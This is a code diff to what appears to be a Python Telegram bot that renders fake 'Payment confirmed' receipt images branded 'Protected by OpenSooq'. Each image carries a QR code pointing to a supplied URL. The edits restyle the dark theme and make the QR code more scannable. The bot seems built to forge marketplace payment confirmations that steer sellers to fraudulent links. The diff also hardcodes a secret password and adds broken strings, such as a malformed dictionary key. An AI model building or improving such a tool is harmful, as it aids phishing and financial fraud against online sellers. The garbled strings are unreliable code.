@@ -26,16 +26,16 @@ TOKEN = os.environ.get("TOKEN")
 SECRET_PASSWORD = "МойСекретныйПароль123"
 ADMIN_ID = 1110325917 
 
-# --- ЦВЕТА ДЛЯ ТЕМНОЙ ТЕМЫ ---
+# --- ЦВЕТА ДЛЯ ТЕМНОЙ ТЕМЫ (ОБНОВЛЕНЫ) ---
 GREEN = "#22C55E"        
 LIGHT_GREEN = "#064E3B"  
 NAVY = "#F8FAFC"         # Белый текст
 GRAY = "#94A3B8"         # Светло-серый текст
-BORDER = "#334155"       # Темная обводка
-BG_COLOR = "#0F172A"     # Темный фон
-CARD_BG = "#1E293B"      # Темные блоки
+BORDER = "#1E293B"       # Темная обводка (Slate-800)
+BG_COLOR = "#020617"     # Очень темный фон (Slate-950)
+CARD_BG = "#0F172A"      # Темные блоки (Slate-900)
 QR_EYE_COLOR = "#0DEF05" # Ярко-зеленые глазки QR
-QR_DOT_COLOR = "#F8FAFC" # Белые точки QR
+QR_DOT_COLOR = "#000000" # Черные точки для сканирования
 
 WAITING_PRICE, WAITING_NAME = range(2)
 REGISTERED_USERS = {}
@@ -44,9 +44,9 @@ RECENT_LINKS = {}
 TRANSLATIONS = {
     "EN": {
         "payment_confirmed": "Payment confirmed", "payment_secure": "Your payment has been secured.",
-        "order": "Order #", "processing": "Processing", "transaction_id": "Transaction ID",
-        "tracking_number": "Tracking Number", "delivery_status": "Delivery Status", "in_progress": "In progress",
-        "waiting_seller": "Waiting for the seller\nto receive the funds", "seller_confirmed": "Seller confirmed",
+        "order": "Order #", "processing": "Processing", "transaction_id": "\Transaction ID",
+        "tracking_number": "Tracking Number", "deliverynto_status": "Delivery Status", "in_progress": "In progress",
+        "waiting_seller": "Waiting for the seller receive the funds", "seller_confirmed": "Seller confirmed",
         "preparing": "Preparing shipment", "courier": "Courier pickup", "protected": "Protected by OpenSooq",
         "protected_text": "Your payment is secure and protected until you receive your order.",
         "help": "(i) Need help? Visit our Help Center or contact support.",
@@ -124,7 +124,7 @@ def fit_text(draw, value, max_width, size=28, is_arabic_text=False):
         value = value[:-2] + "…"
     return value, f
 
-# --- QR КОД ---
+# --- QR КОД (ОБНОВЛЕН ДЛЯ СКАНИРОВАНИЯ) ---
 def generate_new_qr(data, size=230):
     qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=10, border=0)
     qr.add_data(data)
@@ -133,8 +133,11 @@ def generate_new_qr(data, size=230):
     n = len(matrix)
     box_size = size // n
     actual_size = box_size * n
-    img = Image.new("RGBA", (actual_size, actual_size), (255, 255, 255, 0))
+    
+    # БЕЛЫЙ ФОН ДЛЯ QR
+    img = Image.new("RGBA", (actual_size, actual_size), (255, 255, 255, 255))
     draw = ImageDraw.Draw(img)
+    
     for r in range(n):
         for c in range(n):
             if matrix[r][c]:
@@ -142,11 +145,14 @@ def generate_new_qr(data, size=230):
                 x0, y0 = c * box_size, r * box_size
                 x1, y1 = x0 + box_size, y0 + box_size
                 draw.ellipse([x0, y0, x1, y1], fill=QR_DOT_COLOR)
+                
     def draw_eye(x, y):
         eye_size = box_size * 7
         draw.rounded_rectangle([x, y, x + eye_size, y + eye_size], radius=box_size*2, fill=QR_EYE_COLOR)
-        draw.rounded_rectangle([x+box_size, y+box_size, x+eye_size-box_size, y+eye_size-box_size], radius=box_size, fill=BG_COLOR)
+        # Внутренний белый квадрат для сканера
+        draw.rounded_rectangle([x+box_size, y+box_size, x+eye_size-box_size, y+eye_size-box_size], radius=box_size, fill=(255, 255, 255, 255))
         draw.rounded_rectangle([x+box_size*2, y+box_size*2, x+eye_size-box_size*2, y+eye_size-box_size*2], radius=box_size//2, fill=QR_EYE_COLOR)
+        
     draw_eye(0, 0); draw_eye(actual_size - box_size * 7, 0); draw_eye(0, actual_size - box_size * 7)
     return img
 
@@ -156,6 +162,7 @@ def make_card(data, lang="EN"):
     W, H = 1000, 1450 
     image = Image.new("RGB", (W, H), BG_COLOR)
     draw = ImageDraw.Draw(image)
+    
     def draw_check_icon(x, y, size, color):
         draw.ellipse((x, y, x+size, y+size), fill=color)
         cx, cy = x + size//2, y + size//2
@@ -197,7 +204,8 @@ def make_card(data, lang="EN"):
     price_str = f"{data['price']} {curr}" if data["price"] else t["price_not_avail"]
     draw.text((320, 480), price_str, font=font(45, True), fill=NAVY)
     
-    draw.rounded_rectangle((630, 210, 930, 640), radius=20, fill="#0F172A", outline=BORDER, width=2)
+    # Блок с QR-кодом (теперь с белым фоном для контраста)
+    draw.rounded_rectangle((630, 210, 930, 640), radius=20, fill="#FFFFFF", outline=BORDER, width=2)
     qr_img = generate_new_qr(data["url"], size=230) 
     image.paste(qr_img, (665, 240), qr_img) 
     
